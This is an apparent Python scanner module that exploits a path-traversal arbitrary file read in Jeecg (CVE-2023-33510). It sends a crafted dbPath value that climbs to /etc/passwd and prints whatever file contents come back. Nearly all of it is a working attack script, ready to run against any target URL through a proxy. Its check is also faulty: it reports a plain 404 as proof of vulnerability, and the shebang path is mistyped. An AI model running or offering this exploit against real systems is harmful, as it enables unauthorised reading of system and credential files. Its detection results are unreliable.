#!/user/bin/env python3
# -*- coding: utf-8 -*-
import urllib3
import requests
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet
urllib3.disable_warnings()
class Cve_2023_33510:
    def main(self,target):
        OutPrintInfo("Jeecg", '开始检测Jeecg任意文件读取漏洞')
        url = target[0].strip("/ ")
        ssl = target[1]
        header = target[2]
        proxy = target[3]

        req = ReqSet(proxy=proxy)
        proxies = req["proxy"]
        req_url = f"{url}/chat/imController/showOrDownByurl.do?dbPath=../../../../../../etc/passwd"
        try:
            headers = {
                "User-Agent": header,
                "Accept-Encoding": "gzip",
                "Accept": "*/*",
                "Accept-Language": "en",
                "Connection": "close",
            }
            response = requests.post(req_url, verify=ssl, timeout=5,headers=headers,proxies=proxies)
            response.encoding = response.apparent_encoding
            if 'root:' in response.text or response.status_code == 404:
                OutPrintInfo("Jeecg", '[b bright_red]存在Jeecg任意文件读取漏洞')
                OutPrintInfo("Jeecg", response.text)
            else:
                OutPrintInfo("Jeecg", '不存在Jeecg任意文件读取漏洞')
        except requests.RequestException as e:
            pass




        OutPrintInfo("Jeecg", 'Jeecg任意文件读取漏洞检测结束')